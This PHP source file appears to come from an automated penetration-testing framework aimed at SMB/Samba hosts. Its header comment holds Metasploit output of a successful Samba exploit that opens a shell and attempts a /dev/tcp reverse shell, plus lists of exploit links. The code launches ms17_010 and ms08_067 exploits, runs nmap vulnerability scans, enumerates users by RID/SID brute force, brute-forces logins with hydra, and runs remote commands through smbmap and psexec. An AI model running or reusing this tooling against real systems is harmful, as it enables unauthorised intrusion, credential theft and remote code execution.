<?php


class service2smb extends service2asterisk {

/*
 * https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions
 * https://github.com/SpiderLabs/scavenger
 * 
 * 
 * msf5 exploit(linux/samba/is_known_pipename) > run

[*] 172.31.65.16:445 - Using location \\172.31.65.16\STOCKFINI\POS_DIR for the path
[*] 172.31.65.16:445 - Retrieving the remote path of the share 'STOCKFINI'
[*] 172.31.65.16:445 - Share 'STOCKFINI' has server-side path '/wat04/application2
[*] 172.31.65.16:445 - Uploaded payload to \\172.31.65.16\STOCKFINI\POS_DIR\WigCTSjH.so
[*] 172.31.65.16:445 - Loading the payload from server-side path /wat04/application2/POS_DIR/WigCTSjH.so using \\PIPE\/wat04/application2/POS_DIR/WigCTSjH.so...
[+] 172.31.65.16:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 6 opened (10.21.199.10:46357 -> 172.31.65.16:445) at 2019-04-04 15:14:01 +0200
[*] Session ID 6 (10.21.199.10:46357 -> 172.31.65.16:445) processing AutoRunScript 'multi_console_command -c /bin/sh -i > /dev/tcp/10.21.199.10'
[-] The specified shell session script could not be found: multi_console_command



   auxiliary/scanner/smb/impacket/dcomexec                                  2018-03-19       normal  Yes    DCOM Exec
   auxiliary/scanner/smb/impacket/secretsdump                                                normal  Yes    DCOM Exec
   auxiliary/scanner/smb/impacket/wmiexec                                   2018-03-19       normal  Yes    WMI Exec
   auxiliary/scanner/smb/pipe_auditor                                                        normal  Yes    SMB Session Pipe Auditor
   auxiliary/scanner/smb/pipe_dcerpc_auditor                                                 normal  Yes    SMB Session Pipe DCERPC Auditor
   auxiliary/scanner/smb/psexec_loggedin_users                                               normal  Yes    Microsoft Windows Authenticated Logged In Users Enumeration
   auxiliary/scanner/smb/smb1                                                                normal  Yes    SMBv1 Protocol Detection
   auxiliary/scanner/smb/smb2                                                                normal  Yes    SMB 2.0 Protocol Detection
   auxiliary/scanner/smb/smb_enum_gpp                                                        normal  Yes    SMB Group Policy Preference Saved Passwords Enumeration
   auxiliary/scanner/smb/smb_enumshares                                                      normal  Yes    SMB Share Enumeration
   auxiliary/scanner/smb/smb_enumusers                                                       normal  Yes    SMB User Enumeration (SAM EnumUsers)
   auxiliary/scanner/smb/smb_enumusers_domain                                                normal  Yes    SMB Domain User Enumeration
   auxiliary/scanner/smb/smb_login                                                           normal  Yes    SMB Login Check Scanner
   auxiliary/scanner/smb/smb_lookupsid                                                       normal  Yes    SMB SID User Enumeration (LookupSid)
   auxiliary/scanner/smb/smb_ms17_010                                                        normal  Yes    MS17-010 SMB RCE Detection
   auxiliary/scanner/smb/smb_uninit_cred                                                     normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   auxiliary/scanner/smb/smb_version                                                         normal  Yes    SMB Version Detection
   
   https://github.com/opsxcq/exploit-CVE-2017-7494/blob/master/bindshell-samba.c
   https://github.com/ShawnDEvans/smbmap
   
   https://www.exploit-db.com/exploits/42084        Samba 3.5.0 < 4.4.14/4.5.10/4.6.4
   https://www.exploit-db.com/exploits/42060        Samba 3.5.0 - Remote Code Execution
   https://www.exploit-db.com/exploits/41740        Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory
   https://www.exploit-db.com/exploits/21850        Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow
   https://www.exploit-db.com/exploits/37834        Samba 3.5.11/3.6.3 - Remote Code Execution
   https://www.exploit-db.com/exploits/16860        Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption
   https://www.exploit-db.com/exploits/16320        Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
   https://www.exploit-db.com/exploits/16859        Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow
   https://www.exploit-db.com/exploits/16861        Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow        
   https://www.exploit-db.com/exploits/16330        Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow
   https://www.exploit-db.com/exploits/16880        Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow
   https://www.exploit-db.com/exploits/16321        Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow
   https://www.exploit-db.com/exploits/7701         Samba < 3.0.20 - Remote Heap Overflow         
   
   https://www.hackingarticles.in/smb-penetration-testing-port-445/
   
 */
    public function __construct($stream,$eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$service_protocol);
    }

    function service2smb2ms08_067_netapi2nmap(){
        $result = "";
        $result .= $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms08-067.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        return $result;
    }
    
    function service2smb2ms17_010_netapi2msf(){
        $this->ssTitre(__FUNCTION__);
        $result = ""; // \nset TARGET 25 \nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast
        $query = "echo \"db_status\n use exploit/windows/smb/ms17_010_netapi\n set RHOST \"$this->ip\"\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
        $this->requette($query);
        $this->requette("cat $this->dir_tmp/ntlm_hash_john.rc");
        $this->pause();
        $this->cmd("localhost", "msfconsole -q -r $this->dir_tmp/ntlm_hash_john.rc -y /usr/share/metasploit-framework/config/database.yml");
        $this->pause();
    }
    
    function service2smb2ms17_010_netapi2nmap(){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms17-010.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);       
        return $result;
    }

    function service2smb2ms08_067_netapi2msf(){
        $this->ssTitre(__FUNCTION__);
        $result = ""; // \nset TARGET 25 \nset AutoRunScript \"hashdump\"\nrun\n use auxiliary/analyze/jtr_crack_fast
        $query = "echo \"db_status\n use exploit/windows/smb/ms08_067_netapi\n set RHOST \"$this->ip\"\n run\n \" > $this->dir_tmp/ntlm_hash_john.rc";
		$this->requette($query);
		$this->requette("cat $this->dir_tmp/ntlm_hash_john.rc");
		$this->pause();
		$this->cmd("localhost", "msfconsole -q -r $this->dir_tmp/ntlm_hash_john.rc -y /usr/share/metasploit-framework/config/database.yml");
		$this->pause();
    }
    
    function service2smb4nmap(){
        $this->titre(__FUNCTION__);
        $result = "";
        $os = $this->req_ret_str("echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-os-discovery.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -");
        
        $result .= $os ;
        
        $test_os = "echo -e \"$os\" | grep 'OS:' | cut -d':' -f2 ";
        exec($test_os,$tmp_os);
        if (!empty($tmp_os)) {
            $this->req2BD4in("ip2os4enum", "IP","ip = '$this->ip'","$tmp_os[0]");
            $this->ip2os4arch($tmp_os[0]);
        }
        
        $test_name = "echo -e \"$os\" | grep 'Computer name:' | cut -d':' -f2 ";
        exec($test_os,$tmp_name);
        if (!empty($tmp_name)) {
            $tmp_name[0] = trim($tmp_name[0]);
            $this->req2BD4in("ip2os4enum", "IP","ip = '$this->ip'","$tmp_name[0]");
        }
        

        
        $query = "nmblookup -A $this->ip ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms17-010.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $this->pause();
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-double-pulsar-backdoor.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script msrpc-enum.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-domains.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-groups.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-processes.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-sessions.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-system-info.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-server-stats.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $this->pause();
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-shares,smb-ls -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        //nmap  -Pn -n --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p445 <host>
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-enum-users.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-mbenum.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-security-mode.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-cve-2017-7494.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-cve2009-3103.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $this->pause();
        
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms06-025.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms10-054.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms10-061.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-vuln-ms07-029.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);

        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-system-info.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script smb-server-stats.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";
        $result .= $this->cmd("localhost",$query);
        $result .= $this->req_ret_str($query);
        
        $this->pause();
        
        // Aucun resultat 
        //$query = "nmap -Pn -n --script smb-brute.nse --script-args userdb=$this->dico_users,passdb=$this->dico_users -s$this->protocol -p $this->port $this->ip -e $this->eth -oX - ";
        // $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
        
        return $result;
    }
    
    
    
    function service2smb4exec(){ // 445 + 139 + 137
        $result = "";

        $this->titre(__FUNCTION__);
            /*
        $query = "echo \"db_status\nuse exploit/linux/samba/trans2open\nset RHOST $kio1_service_smb->ip\nset RPORT $kio1_service_smb->port\nset payload linux/x86/shell_reverse_tcp\nset LHOST $prof\nshow options\nexploit\nexit -y\n \" > $this->dir_tmp/".__FUNCTION__.".$kio1_service_smb->ip.$kio1_service_smb->port.rc";
		$this->requette($query);
		$query = "msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$kio1_service_smb->ip.$kio1_service_smb->port.rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
		$this->requette($query);$this->pause();
             */
            //if(!file_exists("$this->dir_tmp/trans2root")) $this->requette("gcc $this->dir_tools/exploits/trans2root.c -o $this->dir_tmp/trans2root -w");
            //$result .= $this->req_ret_str("$this->dir_tmp/trans2root -t $this->ip");
            
            //$this->service2smb4nmap();$this->pause();
            
            //$this->service2smb2ms08_067_netapi2nmap();
            //$this->service2smb2ms08_067_netapi2msf();
            //
            $this->pause();
           
            
            $this->article("just for compare", "remove later enum4linux");
            $query = "perl $this->dir_tools/enum4linux.pl $this->ip";
            //$this->requette($query);
            
            $this->service2smb4users("WORKGROUP","", "");

            //$this->service2msrpc();
            $this->pause();
            

            
            $tab_users_shell = $this->ip2users();
            foreach ($tab_users_shell as $user2name_shell){
                $result .= $this->article("USER FOUND FOR TEST", "$user2name_shell");
                $this->port2auth4pass4hydra("smb",$user2name_shell,"password");$this->pause();
                $this->port2auth4pass4hydra("smb",$user2name_shell,"");$this->pause();
                $this->port2auth4dico4hydra("smb",$user2name_shell);$this->pause();
            }

            $this->pause();
            $work_groups = $this->service2smb4workgroup();
            
            var_dump($work_groups);
            $this->pause();
            foreach ($work_groups as $work_group) {
                $work_group = trim($work_group);
                $this->service2smb4smb($work_group,"","");$this->pause();
                foreach ($tab_users_shell as $user2name_shell){
                    $result .= $this->article("USER/PASSWORD FOUND FOR TEST", "$user2name_shell");
                    $this->service2smb4smb($work_group,$user2name_shell,"password");$this->pause();
                }
            }
            
            $users = $this->ip2users4passwd();
            foreach ($users as $user2name => $user2pass){
                if(!empty($user2name))
            foreach ($work_groups as $work_group)	{
                $work_group = trim($work_group);
                    $query_hydra = "hydra -l \"$user2name\" -p \"$user2pass\" $this->ip smb -f -s $this->port -w 5s -I 2>/dev/null  | grep -i 'login:'  | grep -i 'password:' ";
                    $check = $this->req_ret_str($query_hydra);
                    if(!empty($check)){  
                        $this->auth2login4hydra($check); 
                        $this->service2smb4smb($work_group,$user2name,$user2pass);$this->pause();
                     
                        $query = "nmap --script smb-psexec.nse --script-args=smbuser=$user2name,smbpass=$user2pass -s$this->protocol -p $this->port $this->ip";
                        $this->req_ret_str($query);
                        $cmd_unix = "id";
                        $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x \"$cmd_unix\" 2> /dev/null ");
                        $this->req_ret_str("smbmap -H $this->ip -u '$user2name' -p '$user2pass' -d '$work_group' -x 'net group \"Domain Admins\" /domain'");
                        $this->pause();
                       
                }
            }
            }
 
            return $result;
    }
    
    
    
    function service2smb4workgroup(){
        $result = "";
        $this->ssTitre("Got domain/workgroup name");
        $work_groups = $this->req_ret_tab("nmblookup -A $this->ip | grep '<GROUP>' | grep '<00>' | cut -d'<' -f1 ");
        $this->pause();
        if (!empty($work_groups)){
            foreach ($work_groups as $work_group){
                $work_group = trim($work_group);
                $this->article("WORKGROUP", $work_group);
            }
            return $work_groups;
        }
        $this->pause();
        $tmp = $this->service2smb4query("WORKGROUP",'','',"lsaquery","");// 445 only
        exec("echo '$tmp' | grep 'Domain Name:' | cut -d':' -f2 ",$rst);
        if (isset($rst[0])) $work_group = trim($rst[0]);
        if (!empty($work_group)) return array($work_group);
        else return array("WORKGROUP");
    }
    
    
    function service2smb4users4method1($work_group,$user2name, $user2pass){
        $users_found = array();
        $this->ssTitre(__FUNCTION__);
        ###################################  METHODE 1 #########################################
        $user_querydispinfo = $this->service2smb4query($work_group,$user2name,$user2pass,"querydispinfo","");// 445 only
        $user_querydispinfo = trim($user_querydispinfo);
        
        
        if(!empty($user_querydispinfo)){
            exec("echo '$user_querydispinfo'  | cut -d':' -f5 | sed \"s/Name//g\" ",$tmp_users);// 445 only
            exec("echo '$user_querydispinfo' | cut -d':' -f6 | sed \"s/Desc//g\" ",$tmp_users_info);// 445 only
            
            if (!empty($tmp_users)){
                for($i=0;$i<count($tmp_users) ;$i++){
                    $tmp_user = trim($tmp_users[$i]);
                    if (!empty($tmp_user)) {
                        $this->yesUSERS($this->port2id, $tmp_user,"querydispinfo: ".$tmp_users_info[$i],"/bin/sh");
                        $users_found[] = $tmp_user;
                    }
                }
                
            }
        }
        $users_found = array_unique($users_found);
        //var_dump($users_found);$this->pause();
        
        return $users_found;
    }
    
    
    
    function service2smb4users4method2($work_group,$user2name, $user2pass){
        $users_found = array();
        $this->ssTitre(__FUNCTION__);
        ###################################  METHODE 2 #########################################
        $userbydomain = $this->service2smb4query($work_group,$user2name,$user2pass,"enumdomusers","");// 445 only
        
        $userbydomain = trim($userbydomain);
        if (!empty($userbydomain)) {
            exec("echo '$userbydomain'   | cut -d'[' -f2 | cut -d']' -f1  ",$tmp_users);
            if (!empty($tmp_users))
                foreach ($tmp_users as $tmp_user){
                    $tmp_user = trim($tmp_user);
                    if (!empty($tmp_user)) {
                        $this->yesUSERS($this->port2id, $tmp_user,"enumdomusers","/bin/sh");
                        $users_found[] = $tmp_user;
                    }
            }
            
        }
        $users_found = array_unique($users_found);
        //var_dump($users_found);$this->pause();
        return $users_found;
    }
    
    
    
    function service2smb4users4method3($work_group,$user2name, $user2pass){
        $this->ssTitre(__FUNCTION__);
        $users_found = array();
        $this->ssTitre("Getting groups memberships");
        $memberships =  $this->service2smb4groups($work_group, $user2name, $user2pass);
        
        $tmp = "";
        foreach ($memberships as $member ){
            $member = trim($member);
            if (!empty($member)) $tmp .= $this->req_ret_str("net rpc group members '$member' -w '$work_group' -I '$this->ip'  -U '$user2name'%'$user2pass' 2> /dev/null | grep -v 'not' | grep -v 'FAILURE' | grep -v \"Couldn't\" |  cut -d'\' -f2 ")."\n";
            
        }
        $tmp_users_found = explode("\n", $tmp);
        $tmp_users_found = array_unique($tmp_users_found);
        foreach ($tmp_users_found as $user_found){
            $user_found = trim($user_found);
            if(!empty($user_found)) {
                $this->yesUSERS($this->port2id, $user_found,"net rpc group members","/bin/sh");
                $users_found[] = $user_found;
            }
        }
        
        $users_found = array_unique($users_found);
        //var_dump($users_found);$this->pause();
        return $users_found;
    }
    
    
    
    function service2smb4users4method4($work_group,$user2name, $user2pass){
        $this->ssTitre(__FUNCTION__);
        $tmp = "";
        $users_found = array();
        $this->ssTitre("Find User By Dico Number - RID ".__FUNCTION__);        
        for ($i=0;$i<=55;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
        for ($i=495;$i<=555;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
        for ($i=995;$i<=1055;$i++) $tmp .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" "); // 445 + 139
        
            var_dump($tmp);
             $this->pause();
             $tmp = trim($tmp);
             if (empty($tmp)) return $users_found;
            $users_found = array_unique(explode("\n", $tmp));
            foreach ($users_found as $user_found )
                if (!empty($user_found))  {
                    $this->yesUSERS($this->port2id, $user_found,"query user with rid ","/bin/sh");
                }
        
        $users_found = array_unique($users_found);
        var_dump($users_found);$this->pause();
        return $users_found;
    }
    

    public function service2smb2sid($work_group,$user2name,$user2pass){
        $this->ssTitre("Attempting to get SID");
        $tmp_sid = array();
        $tab_sids = array();
        $sid_lsaenumsid = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaenumsid","");// 445 only
        var_dump($sid_lsaenumsid);$this->pause();
        
        $sid_lsaquery = $this->service2smb4query($work_group,$user2name,$user2pass,"lsaquery","");// 445 only
        var_dump($sid_lsaquery);$this->pause();
        
        $users_test = file($this->dico_users);
        $sid_lookupnames = "";
        foreach ($users_test as $user_test){
            $user_test = trim($user_test);
            $tmp = "";
            $tmp = $this->service2smb4query($work_group,$user2name,$user2pass,"lookupnames $user_test"," | grep -E \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{0,}\" | awk '{print $2}' | grep -Po \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{1,}\" | sort -u");// 445 only
            if (!empty($tmp)) {
                $sid_lookupnames .= $tmp;

            }
        }
        var_dump($sid_lookupnames);$this->pause();
        $this->pause();
        $query = "echo '$sid_lsaenumsid.$sid_lsaquery.$sid_lookupnames' | grep -Po \"S-[[:digit:]]{1,}-[[:digit:]]{1,}-[[:digit:]]{1,}[[:print:]]{1,}\" | sort -u";
        exec($query,$tmp_sid);
        var_dump($tmp_sid);$this->pause();
        
        foreach ($tmp_sid as $sid_tmp){
            $query = "echo '$sid_tmp' | cut -d'-' -f1-\$(echo '$sid_tmp' | grep -Po '-' | wc -l) ";
            $sid = trim($this->req_ret_str($query));
            if (!empty($sid)) $tab_sids[] = $sid;
        }
        
        
        if (!empty($tab_sids)) {
            $tab_sids = array_filter(array_unique($tab_sids));
            sort($tab_sids);
        }
        var_dump($tab_sids);$this->pause();
        return $tab_sids;
    }
    
 
    
    
    function service2smb4users4method5($work_group,$user2name, $user2pass){
        $this->ssTitre(__FUNCTION__);
        $users_found = array();
        $this->ssTitre("Attempting to get SID");
        
      
        
        $tab_sids = $this->service2smb2sid($work_group, $user2name, $user2pass);
        var_dump($tab_sids);$this->pause();
        $tmp2 = "";
        foreach ($tab_sids as $sid){
            if (!empty($sid)) {
                $this->article("SID", $sid);
                
                for ($rid = 0;$rid<=55;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid'  "); // | cut -d'\' -f2  | cut -d'(' -f1
                for ($rid = 100;$rid<=155;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid'  "); // | cut -d'\' -f2  | cut -d'(' -f1
                for ($rid = 495;$rid<=555;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null | grep -v '*unknown*' ");
                for ($rid = 995;$rid<=1055;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids $sid-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*' ");
                
            }
        }
        
        var_dump($tmp2);
        $this->pause();
        $tmp2 = trim($tmp2);
        if (empty($tmp2)) return $users_found;
        
        $users_found = array_filter(array_unique(explode("\n", $tmp2)));
        if (!empty($users_found))
            foreach ($users_found as $user_found )
                if (!empty($user_found))  {
                    $this->yesUSERS($this->port2id, $user_found,"lookupnames","/bin/sh");
                }
            
            
            
            var_dump($users_found);$this->pause();
            
            return $users_found;
    }
    
    
    function service2smb4enum2users(){
        $this->titre("Attempting to get userlist ");
        $work_groups = $this->service2smb4workgroup();
        foreach ($work_groups as $work_group) 
            $this->service2smb4users($work_group,"", "");
    }
    
    function service2smb4users($work_group,$user2name, $user2pass){
        $this->titre("Attempting to get userlist ");
        $tmp2 = "";
        $users_found = array();

        for ($rid = 500;$rid<=550;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids S-1-22-1-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid' | cut -d'\' -f2  | cut -d'(' -f1"); // | cut -d'\' -f2  | cut -d'(' -f1
        for ($rid = 1000;$rid<=1050;$rid++) $tmp2 .= $this->req_ret_str("rpcclient -c 'lookupsids S-1-22-1-$rid' -U '$user2name'%'$user2pass'  '$this->ip' -p $this->port  2>/dev/null  | grep -v '*unknown*'  | grep -v '\\\\$rid' | cut -d'\' -f2  | cut -d'(' -f1"); // | cut -d'\' -f2  | cut -d'(' -f1
        var_dump($tmp2);
        $this->pause();
        $tmp2 = trim($tmp2);
        if (empty($tmp2)) return $users_found;
        else {
        $users_found = array_filter(array_unique(explode("\n", $tmp2)));
        if (!empty($users_found))
            foreach ($users_found as $user_found )
                if (!empty($user_found))  {
                    $this->yesUSERS($this->port2id, $user_found,"lookupsids","/bin/sh");
                }
            
            
            
            var_dump($users_found);$this->pause();
            
            if(!empty($users_found)) return $users_found;
        }
            
        if(!empty($users_found)) return $users_found;
        else $users_found = $this->service2smb4users4method5($work_group, $user2name, $user2pass);
        $this->pause();
        
        
        
        $users_found =  $this->service2smb4users4method1($work_group, $user2name, $user2pass);
        $this->pause();
        
        if(!empty($users_found)) return $users_found;
        else $users_found = $this->service2smb4users4method2($work_group, $user2name, $user2pass);
        $this->pause();
        
        if(!empty($users_found)) return $users_found;
        else $users_found = $this->service2smb4users4method3($work_group, $user2name, $user2pass);
        $this->pause();
        
        if(!empty($users_found)) return $users_found;
        else $users_found = $this->service2smb4users4method4($work_group, $user2name, $user2pass);
        $this->pause();
  
        
        if(!empty($users_found)) return $users_found;
        else $users_found = $this->service2smb4users4method5($work_group, $user2name, $user2pass);
        $this->pause();
        

        
        var_dump($users_found);$this->pause();

        return $users_found;
    }
    
    
    
    function service2smb4query($work_group,$user2name, $user2pass,$query,$filter){
        $work_group = trim($work_group);
        $user2name = trim($user2name);
        $user2pass = trim($user2pass);
        return $this->req_ret_str("echo '$this->root_passwd' | sudo -S rpcclient -W '$work_group' -U '$user2name'%'$user2pass' -c '$query'  '$this->ip' -p $this->port 2> /dev/null  $filter   ");
    }
    
    function service2smb4groups($work_group,$user2name, $user2pass){
        
        $result = "";
        
        $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups builtin","");
        $this->service2smb4query($work_group,$user2name, $user2pass,"enumalsgroups domain","");
        $this->service2smb4query($work_group,$user2name, $user2pass,"enumdomgroups","");
         //   for ($i=0;$i<=50;$i++)  $result .=  $this->service2smb4query($work_group,$user2name, $user2pass,"querygroup $i"," | grep \"Name   :\" | cut -d':' -f2 | grep -Po \"[[:print:]]{1,}\" ",""); // 445 + 139
 
        
        $result = trim($result);
        return array_unique(explode("\n", $result));
        
    }
    
    
    
    function service2smb4os($work_group,$user2name, $user2pass){
        $result = "";
        $this->titre(__FUNCTION__);
        $this->ssTitre("Attempting to make $user2name session and get OS info");
        
        $query = "smbclient -W '$work_group' -L $this->ip -U '$user2name'%'$user2pass'  2>/dev/null ";
          $result .= $this->req_ret_str($query);
        
        $query = "smbclient -W '$work_group' -L $this->ip -U '$user2name'%'$user2pass'  2>/dev/null | grep -Po \"[A-Z]{1,5}\\\\\$\" | cut -d'$' -f1 ";
        
        $reps = $this->req_ret_str($query);
        $result .= $reps;
        
        $query = "smbclient //$this->ip/IPC$  -U '$user2name'%'$user2pass' -t 1 -c \"help\"  2>/dev/null "; // 445 + 139
          $this->req_ret_str($query);
        
        $query = "smbclient //$this->ip/IPC$  -U '$user2name'%'$user2pass' -t 1 -c \"listconnect\"  2>/dev/null "; // 445 + 139
          $this->req_ret_str($query);
        
        $this->ssTitre("Attempting map to share");
        $tab_reps = explode("\n", $reps);
        foreach ($tab_reps as $rep){
            $rep = trim($rep);
            if (!empty($rep)) {
                $this->article("Working with REP ",$rep);
                $query = "smbclient -W '$work_group' //$this->ip/$rep$ -U '$user2name'%'$user2pass' -c 'ls'  2>/dev/null  |  grep -v \"NT_STATUS\" | grep -v \"could not\"  | grep -v \"Connection failed\"  | grep -v \"Bad SMB2 signature for message\" | grep -v \"\[0000\]\" ";  // 445 + 139
                $this->req_ret_str($query);
                
                $this->service2smb4query($work_group,$user2name, $user2pass,"netsharegetinfo $rep","");
            }
        }
        $this->service2smb4query($work_group,$user2name, $user2pass,"srvinfo","");
        $this->service2smb4query($work_group,$user2name, $user2pass,"netshareenumall","");
        $this->service2smb4query($work_group,$user2name, $user2pass,"netdiskenum","");
        
        return $result ;
    }
    
    
    function service2smb4smb($work_group,$user2name, $user2pass){ // 445 + 139
        $result = "";
        $this->titre(__FUNCTION__);
        $users = array();

        
